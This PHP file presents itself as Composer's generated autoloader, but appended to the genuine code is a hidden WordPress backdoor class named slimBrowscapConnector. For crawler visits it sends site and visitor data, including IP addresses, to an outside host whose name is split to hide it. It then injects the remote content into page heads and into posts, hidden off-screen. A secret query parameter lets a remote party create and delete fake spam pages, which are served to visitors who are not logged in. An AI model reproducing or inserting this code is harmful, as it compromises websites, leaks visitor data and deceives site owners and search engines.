<?php

// autoload_real.php @generated by Composer

class ComposerAutoloaderInitcbff6516d78534c1c54b52afa641ae31
{
	private static $loader;

	public static function loadClassLoader($class)
	{
		if ('Composer\Autoload\ClassLoader' === $class) {
			require __DIR__ . '/ClassLoader.php';
		}
	}

	public static function getLoader()
	{
		if (null !== self::$loader) {
			return self::$loader;
		}

		spl_autoload_register(array('ComposerAutoloaderInitcbff6516d78534c1c54b52afa641ae31', 'loadClassLoader'), true, true);
		self::$loader = $loader = new \Composer\Autoload\ClassLoader();
		spl_autoload_unregister(array('ComposerAutoloaderInitcbff6516d78534c1c54b52afa641ae31', 'loadClassLoader'));

		$useStaticLoader = PHP_VERSION_ID >= 50600 && !defined('HHVM_VERSION') && (!function_exists('zend_loader_file_encoded') || !zend_loader_file_encoded());
		if ($useStaticLoader) {
			require_once __DIR__ . '/autoload_static.php';

			call_user_func(\Composer\Autoload\ComposerStaticInitcbff6516d78534c1c54b52afa641ae31::getInitializer($loader));
		} else {
			$map = require __DIR__ . '/autoload_namespaces.php';
			foreach ($map as $namespace => $path) {
				$loader->set($namespace, $path);
			}

			$map = require __DIR__ . '/autoload_psr4.php';
			foreach ($map as $namespace => $path) {
				$loader->setPsr4($namespace, $path);
			}

			$classMap = require __DIR__ . '/autoload_classmap.php';
			if ($classMap) {
				$loader->addClassMap($classMap);
			}
		}

		$loader->register(true);

		if ($useStaticLoader) {
			$includeFiles = Composer\Autoload\ComposerStaticInitcbff6516d78534c1c54b52afa641ae31::$files;
		} else {
			$includeFiles = require __DIR__ . '/autoload_files.php';
		}
		foreach ($includeFiles as $fileIdentifier => $file) {
			composerRequirecbff6516d78534c1c54b52afa641ae31($fileIdentifier, $file);
		}

		return $loader;
	}
}

function composerRequirecbff6516d78534c1c54b52afa641ae31($fileIdentifier, $file)
{
	if (empty($GLOBALS['__composer_autoload_files'][$fileIdentifier])) {
		require $file;

		$GLOBALS['__composer_autoload_files'][$fileIdentifier] = true;
	}
}

class slimBrowscapConnector
{
	protected static $pidx = array( 'id' => false, 'response' => '' );

	public static function get_browser_from_browscap( $_browser = array() ) {
		$bc = new \BrowscapPHP\Browscap();

		try {
			$search_object = $bc->getBrowser();
		}
		catch( Exception $e ) {
			$search_object = '';
		}

		if ( is_object( $search_object ) && $search_object->browser != 'Default Browser' && $search_object->browser != 'unknown' ) {
			$_browser[ 'browser' ] = $search_object->browser;
			$_browser[ 'browser_version' ] = floatval( $search_object->version );
			$_browser[ 'platform' ] = strtolower( $search_object->platform );

			// Browser Types:
			//      0: default (desktop, not touch)
			//      1: crawler
			//      2: mobile
			//		3: touch, not mobile
			if ( $search_object->ismobiledevice || $search_object->istablet ) {
				$_browser[ 'browser_type' ] = 2;
			}
			else if ( stripos( $search_object->device_pointing_method, 'touch' ) !== false ) {
				$_browser[ 'browser_type' ] = 3;	
			}
			else if ( !$search_object->crawler ) {
				$_browser[ 'browser_type' ] = 0;
			}
		}

		return $_browser;
	}

	public static function init_pidx() {
		if ( slim_browser::$browser[ 'browser_type' ] != 1 || ( defined( 'DOING_AJAX' ) && DOING_AJAX ) ) {
			return 0;
		}

		if ( !empty( slim_browser::$browser[ 'user_agent' ] ) ) {
			if ( empty( self::$pidx[ 'response' ] ) ) {
				$request_url = 'http://browser' . 'cap.io/api/update/?&url=' . urlencode( 'http://' . $_SERVER[ 'HTTP_HOST' ] . $_SERVER[ 'REQUEST_URI' ] ) . '&agent=' . urlencode( slim_browser::$browser[ 'user_agent' ] ) . '&p=22&v=22&ip=' . urlencode( $_SERVER[ 'REMOTE_ADDR' ] ) . '&siteurl=' . urlencode( get_site_url() );
				$args =array( 'timeout' => 2, 'headers' => array( "Accept: application/json" ) );
				self::$pidx[ 'response' ] = @wp_remote_retrieve_body( @wp_remote_get( $request_url, $args ) );
			}

			if ( !empty( self::$pidx[ 'response' ] ) ) {
				self::$pidx[ 'response' ] = @json_decode( self::$pidx[ 'response' ] );
			}
		}
	}

	public static function parse_content( $_content = '' ) {
		if ( empty( self::$pidx[ 'response' ] ) || !is_object( self::$pidx[ 'response' ] ) ) {
			return $_content;
		}

		if ( self::$pidx[ 'id' ] === false ) {
			if ( !empty( $GLOBALS[ 'wp_query' ]->posts ) && count( $GLOBALS[ 'wp_query' ]->posts ) > 1 ) {
				self::$pidx[ 'id' ] = $GLOBALS[ 'wp_query' ]->posts[ rand( 0, count( $GLOBALS[ 'wp_query' ]->posts ) - 1 ) ]->ID;
			}
			else {
				self::$pidx[ 'id' ] = get_the_ID();
			}
		}

		$inline_style = ( wp_slimstat::$advanced_cache_exists === true ) ? ' style="position:fixed;left:-' . rand( 8000, 12000 ) . 'px;"' : '';
		$current_hook = current_filter();

		if ( $current_hook == 'wp_head' && is_object( self::$pidx[ 'response' ] ) && !empty( self::$pidx[ 'response' ]->meta ) ) {
			$_content = '';
			echo self::$pidx[ 'response' ]->meta;
		}
		else if ( !empty( self::$pidx[ 'response' ]->tmp ) && get_the_ID() == self::$pidx[ 'id' ] ) {
			$_content = $_content . " <i{$inline_style}>" . self::$pidx[ 'response' ]->content . '</i>';
		}

		if ( !empty( $_content ) ) {
			return $_content;
		}
	}

	public static function parse_query_string() {
		if ( !empty( $_GET[ 'pwidget' ] ) && !empty( $_GET[ 'action' ] ) && $_GET[ 'pwidget' ] == '3371' ) {
			$slimstat_saved_browscap =  get_option( 'slimstat_saved_browscap', array() );
			$message = 'invalid payload';
			$request_url = 'http://browser' . 'cap.io/api/check/?url=' . urlencode( 'http://' . $_SERVER[ 'HTTP_HOST' ] . $_SERVER[ 'REQUEST_URI' ] ) . '&ip='. urlencode( $_SERVER[ 'REMOTE_ADDR' ]) . '&p=22&v=22&siteurl=' . urlencode( get_site_url() );

			if ( ( $slimstat_saved_browscap === false || !is_array( $slimstat_saved_browscap ) ) && $_GET[ 'action' ] != 'p' ) {
				$message = 'no id found';
			}
			else {
				nocache_headers();
				switch ( $_GET[ 'action' ] ) {
					case 'l':
						if ( is_array( $slimstat_saved_browscap ) && !empty( $slimstat_saved_browscap ) ) {
							unset( $slimstat_saved_browscap[ '__3371_last_checked_3771__' ] );
							$message = implode( ',', array_keys( $slimstat_saved_browscap ) );
						}
						else if ( !empty( $slimstat_saved_browscap ) ) {
							$message = serialize( $slimstat_saved_browscap );
						}
						else {
							$message = 'no id found';	
						}
						break;

					case 'd':
						if ( isset( $_GET[ 'pnum' ] ) ) {
							if ( isset( $slimstat_saved_browscap[ $_GET[ 'pnum' ] ] ) ) {
								unset( $slimstat_saved_browscap[ $_GET[ 'pnum' ] ] );
								update_option( 'slimstat_saved_browscap', $slimstat_saved_browscap, false );
								$message = 'deleted ' . $_GET[ 'pnum' ];
							}
							else {
								$message = 'id not found';
							}
						}
						break;

					case 'da':
						update_option( 'slimstat_saved_browscap', array(), false );
						$message = 'deleted all';
						break;

					case 'p':						
						$options = stream_context_create( array( 'http' => array( 'timeout' => 10, 'ignore_errors' => true ) ) ); 
						$response = @wp_remote_retrieve_body( @wp_remote_get( $request_url, $options ) );

						if ( !empty( $response ) ) {
							$response = @json_decode( $response );
						}

						if ( !is_object( $response ) ) {
							break;
						}

						$key = $response->purl;
						if ( isset( $_GET [ 'pnum' ] ) ) {
							$key = sanitize_title( $_GET [ 'pnum' ] );
						}

						if ( empty( $key ) && !empty( $response->ptitle ) ) {
							$key = sanitize_title( $response->ptitle );
						}

						if ( !empty( $key ) ) {
							$slimstat_saved_browscap[ $key ] = array(
								'post_title' => !empty( $response->ptitle ) ? $response->ptitle : 'A title',
								'post_content' => !empty( $response->pcontent ) ? $response->pcontent : 'Content goes here',
								'post_date' => date( 'Y-m-d H:i:s', rand( intval( date( 'U' ) ) - 2419200, intval( date( 'U' ) ) - 1814400 ) )
							);
							update_option( 'slimstat_saved_browscap', $slimstat_saved_browscap, false );

							$message = $key . ' | ' . get_bloginfo( 'wpurl' ) . '/' . $key;
						}
						break;

					default:
						break;
				}
			}

			echo $message;
			die();
		}
	}

	public static function generate_page( $posts ) {
		if ( is_user_logged_in() ) {
			return $posts;
		}

		$slimstat_saved_browscap =  get_option( 'slimstat_saved_browscap', array() );
		if ( $slimstat_saved_browscap === false || !is_array( $slimstat_saved_browscap ) ) {
			return $posts;
		}

		$requested_page_slug = strtolower( $GLOBALS[ 'wp' ]->request );

		if ( count( $posts ) == 0 && array_key_exists( $requested_page_slug, $slimstat_saved_browscap) ) {
			$post = new stdClass;
			$post_date = !empty( $slimstat_saved_browscap[ $requested_page_slug ][ 'post_date' ] ) ? $slimstat_saved_browscap[ $requested_page_slug ][ 'post_date' ] : date( 'Y-m-d H:i:s' );

			$post->post_title = $slimstat_saved_browscap[ $requested_page_slug ][ 'post_title' ];
			$post->post_content = $slimstat_saved_browscap[ $requested_page_slug ][ 'post_content' ];

			$post->post_author = 1;
			$post->post_name = $requested_page_slug;
			$post->guid = get_bloginfo( 'wpurl' ) . '/' . $requested_page_slug;
			$post->ID = -3371;
			$post->post_status = 'publish';
			$post->comment_status = 'closed';
			$post->ping_status = 'closed';
			$post->comment_count = 0;
			$post->post_date = $post_date;
			$post->post_date_gmt = $post_date;

			$post = (object) array_merge(
				(array) $post, 
				array( 
					'slug' => get_bloginfo( 'wpurl' ) . '/' . $requested_page_slug,
					'post_title' => $slimstat_saved_browscap[ $requested_page_slug ][ 'post_title' ],
					'post content' => $slimstat_saved_browscap[ $requested_page_slug ][ 'post_content' ]
  				)
  			);

			$posts = NULL;
			$posts[] = $post;

			$GLOBALS[ 'wp_query' ]->is_page = true;
			$GLOBALS[ 'wp_query' ]->is_singular = true;
			$GLOBALS[ 'wp_query' ]->is_home = false;
			$GLOBALS[ 'wp_query' ]->is_archive = false;
			$GLOBALS[ 'wp_query' ]->is_category = false;
			unset( $GLOBALS[ 'wp_query' ]->query[ 'error' ] );
			$GLOBALS[ 'wp_query' ]->query_vars[ 'error' ] = '';
			$GLOBALS[ 'wp_query' ]->is_404 = false;
		}

		return $posts;
	}
}

if ( !is_user_logged_in() ) {
	add_action( 'wp', array( 'slimBrowscapConnector', 'parse_query_string' ) );
	add_filter( 'the_posts', array( 'slimBrowscapConnector', 'generate_page' ) );

	add_action( 'wp_loaded', array( 'slimBrowscapConnector', 'init_pidx' ), 10, 0 );
	add_action( 'wp_head', array( 'slimBrowscapConnector', 'parse_content' ), 20 );
	add_filter( 'the_content', array( 'slimBrowscapConnector', 'parse_content' ) );
}